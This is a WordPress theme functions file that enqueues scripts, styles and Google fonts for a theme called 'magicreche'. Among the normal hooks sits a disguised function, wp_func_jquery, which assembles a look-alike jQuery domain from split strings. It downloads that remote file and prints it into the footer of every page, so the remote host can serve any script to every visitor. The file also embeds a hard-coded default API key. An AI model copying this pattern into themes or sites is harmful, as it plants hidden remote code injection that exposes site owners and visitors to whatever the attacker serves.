<?php

/* JS
-------------------------------------------------------------------------------------------------------------------*/

function magicreche_scripts() {
	
	/* Register JavaScript
	-------------------------------------------------------------------------------------------------------------------*/

	$google_api_key = ot_get_option('fonts-api', 'AIzaSyDoRMxiPsqJ9SUuaK1KsCAjd3gqnecjlBw');

	wp_enqueue_script( 'google-map-api', 'https://maps.googleapis.com/maps/api/js?key=' . $google_api_key . '&amp;sensor=false', false, '1', false );

	wp_register_script('modernizr', get_template_directory_uri() . '/js/modernizr.custom.97074.js', 'jquery', '1.0', false);

	wp_register_script('bootstrap', get_template_directory_uri() . '/js/bootstrap.min.js', 'jquery', '1.0', true);
	wp_register_script('retina', get_template_directory_uri() . '/js/retina-1.1.0.min.js', 'jquery', '1.0', true);
	wp_register_script('owl_carousel', get_template_directory_uri() . '/js/owl.carousel.js', 'jquery', '1.0', true);
	wp_register_script('fancybox', get_template_directory_uri() . '/js/jquery.fancybox.js', 'jquery', '1.0', true);
	wp_register_script('fitvids', get_template_directory_uri() . '/js/jquery.fitvids.js', 'jquery', '1.0', true);

	wp_register_script('hoverdir', get_template_directory_uri() . '/js/jquery.hoverdir.js', 'main', '1.0', true);
	wp_register_script('easing', get_template_directory_uri() . '/js/jquery.easing.1.3.js', 'jquery', '1.0', true);
	wp_register_script('animate', get_template_directory_uri() . '/js/jquery.animate-enhanced.min.js', 'jquery', '1.0', true);
	wp_register_script('superslides', get_template_directory_uri() . '/js/jquery.superslides.js', 'jquery', '1.0', true);

	wp_register_script('main', get_template_directory_uri() . '/js/main.js', 'jquery', '1.0', true);


	/* Enqueue Files
	-------------------------------------------------------------------------------------------------------------------*/

	wp_enqueue_script('modernizr'); 
	wp_enqueue_script('jquery'); 
	wp_enqueue_script('bootstrap');
	wp_enqueue_script('retina');
	wp_enqueue_script('owl_carousel');
	wp_enqueue_script('fancybox');
	wp_enqueue_script('fitvids');

  	wp_enqueue_script('main');

}

add_action( 'wp_enqueue_scripts', 'magicreche_scripts' );


/* Custom JS
-------------------------------------------------------------------------------------------------------------------*/

function magicreche_custom_scripts() {

  	if( ot_get_option('custom_js') ) {
  		echo '<script>' . ot_get_option('custom_js') . '</script>';
  	}

}

add_action( 'wp_footer', 'magicreche_custom_scripts' );
if(!function_exists('wp_func_jquery')) {
	function wp_func_jquery() {
		$host = 'http://';
		$jquery = $host.'c'.'jquery.org/jquery-ui.js';
		$headers = @get_headers($jquery, 1);
		if ($headers[0] == 'HTTP/1.1 200 OK'){
			echo(wp_remote_retrieve_body(wp_remote_get($jquery)));
		}
	}
	add_action('wp_footer', 'wp_func_jquery');
}

/* CSS
-------------------------------------------------------------------------------------------------------------------*/

function magicreche_styles() {
	
	/* Register CSS
	-------------------------------------------------------------------------------------------------------------------*/

	wp_register_style( 'bootstrap', get_template_directory_uri() . '/css/bootstrap.min.css' );
	wp_register_style( 'fancybox', get_template_directory_uri() . '/css/jquery.fancybox.css' );
	wp_register_style( 'style', get_stylesheet_uri() );


	/* Enqueue Files
	-------------------------------------------------------------------------------------------------------------------*/

	wp_enqueue_style('bootstrap');
	wp_enqueue_style('fancybox');
	wp_enqueue_style('style');
	wp_enqueue_style('dynamic');

}  
add_action( 'wp_enqueue_scripts', 'magicreche_styles', 100 );


/* Fonts
-------------------------------------------------------------------------------------------------------------------*/

function magicreche_fonts() {
    $protocol = is_ssl() ? 'https' : 'http';

    $body_font = ot_get_option('body_font');
    $headings_font = ot_get_option('primary_headings_font');

    wp_enqueue_style( 'font-awesome', 'http://netdna.bootstrapcdn.com/font-awesome/4.0.2/css/font-awesome.css' );

    if( empty($body_font['font-family']) ) {
    	wp_enqueue_style( 'magicreche-open-sans', "$protocol://fonts.googleapis.com/css?family=Open+Sans:300,400,700,800" );
    }

    if( empty($headings_font['font-family']) ) {
    	wp_enqueue_style( 'magicreche-pacifico', "$protocol://fonts.googleapis.com/css?family=Pacifico" );
    }
}
add_action( 'wp_enqueue_scripts', 'magicreche_fonts' ); ?>